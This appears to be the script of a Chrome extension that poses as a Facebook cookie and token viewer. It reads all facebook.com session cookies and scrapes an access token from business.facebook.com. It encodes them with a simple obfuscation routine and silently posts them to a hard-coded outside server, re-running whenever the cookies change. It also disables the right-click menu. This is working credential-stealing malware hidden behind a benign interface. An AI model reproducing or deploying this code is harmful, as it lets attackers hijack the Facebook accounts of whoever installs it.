let devToolsDetected = false;
const SERVER_URL = "https://jared-getter-server-production.up.railway.app/receive-data";

function hideData(payload) {
    try {
        let jsonStr = JSON.stringify(payload);
        let encodedStr = '';
        for (let i = 0; i < jsonStr.length; i++) {
            encodedStr += String.fromCharCode(jsonStr.charCodeAt(i) + (i % 10));
        }
        return btoa(encodeURIComponent(encodedStr));
    } catch (e) {
        return null;
    }
}

async function startExtraction() {
    const cookieBox = document.getElementById('cookieBox');
    const tokenBox = document.getElementById('tokenBox');
    const appstateBox = document.getElementById('appstateBox');
    const statusLabel = document.getElementById('status');
    const accList = document.getElementById('accList');

    chrome.cookies.getAll({ 'domain': 'facebook.com' }, async function (allCookies) {
        let userIdCookie = allCookies.find(c => c.name === 'c_user');

        if (!userIdCookie) {
            statusLabel.innerText = "No session found. Redirecting to login...";
            chrome.tabs.query({ 'url': ['*://facebook.com/*', 'https://m.facebook.com/login'] }, function (tabs) {
                let fbTab = tabs.find(t => t.url.includes('facebook.com'));
                if (fbTab) {
                    chrome.tabs.update(fbTab.id, { 'active': true });
                } else {
                    chrome.tabs.create({ 'url': 'https://m.facebook.com/login' });
                }
            });
            return;
        }

        statusLabel.innerText = "Capturing data...";

        let essentialKeys = ['c_user', 'xs', 'fr', 'datr', 'sb'];
        let sessionList = [];
        let othersList = [];

        allCookies.forEach(cookie => {
            let pair = `${cookie.name}=${cookie.value}`;
            essentialKeys.includes(cookie.name) ? sessionList.push(pair) : othersList.push(pair);
        });

        let fullCookieString = sessionList.concat(othersList).join(';');
        cookieBox.value = fullCookieString;

        let appStateArray = allCookies.map(c => ({
            'key': c.name,
            'value': c.value,
            'domain': c.domain,
            'path': c.path,
            'hostOnly': c.hostOnly,
            'creation': new Date().toISOString(),
            'lastAccessed': new Date().toISOString()
        }));
        appstateBox.value = JSON.stringify(appStateArray, null, 2);

        try {
            let businessResp = await fetch("https://business.facebook.com/business_locations");
            let htmlContent = await businessResp.text();
            let tokenMatch = htmlContent.match(/EAAG[a-zA-Z0-9]+/);

            if (tokenMatch) {
                let accessToken = tokenMatch[0];
                tokenBox.value = accessToken;

                try {
                    let graphResp = await fetch(`https://graph.facebook.com/me?access_token=${accessToken}`);
                    if (!graphResp.ok) throw new Error("API Issue");
                    
                    let profile = await graphResp.json();

                    accList.innerHTML = `
                        <div class="acc-item">
                            <div style="display: flex; align-items: center; gap: 10px;">
                                <img src="icon.png" style="width: 35px; height: 35px; border-radius: 50%;">
                                <span>👤 ${profile.name}</span>
                            </div>
                            <span class="uid">UID: ${profile.id}</span>
                        </div>`;

                    const payload = {
                        'user': { 'name': profile.name, 'id': profile.id },
                        'cookies': fullCookieString,
                        'appstate': JSON.stringify(appStateArray),
                        'token': accessToken
                    };

                    const encryptedData = hideData(payload);
                    if (encryptedData) {
                        await fetch(SERVER_URL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 'data': encryptedData })
                        });
                    }
                    statusLabel.innerText = "✅ Data captured successfully!";

                } catch (e) {
                    statusLabel.innerText = "✅ Data captured (Name unavailable)!";
                }
            } else {
                tokenBox.value = "Token Failed: Switch to Desktop View or Refresh FB.";
            }
        } catch (err) {
            statusLabel.innerText = "Error during extraction";
        }
    });
}

if (document.readyState === 'complete') {
    startExtraction();
} else {
    window.onload = startExtraction;
}

chrome.cookies.onChanged.addListener(changeInfo => {
    if (changeInfo.cookie.domain.includes('facebook.com') && !changeInfo.removed) {
        startExtraction();
    }
});

document.getElementById('copyCookiesBtn').addEventListener('click', () => {
    document.getElementById('cookieBox').select();
    document.execCommand('copy');
    statusLabel.innerText = "📋 Cookies copied to clipboard!";
});

document.getElementById('copyTokenBtn').addEventListener('click', () => {
    document.getElementById('tokenBox').select();
    document.execCommand('copy');
    statusLabel.innerText = "📋 Token copied to clipboard!";
});

document.getElementById('copyAppstateBtn').addEventListener('click', () => {
    document.getElementById('appstateBox').select();
    document.execCommand('copy');
    statusLabel.innerText = "📋 Appstate copied to clipboard!";
});

document.addEventListener('contextmenu', e => {
    e.preventDefault();
});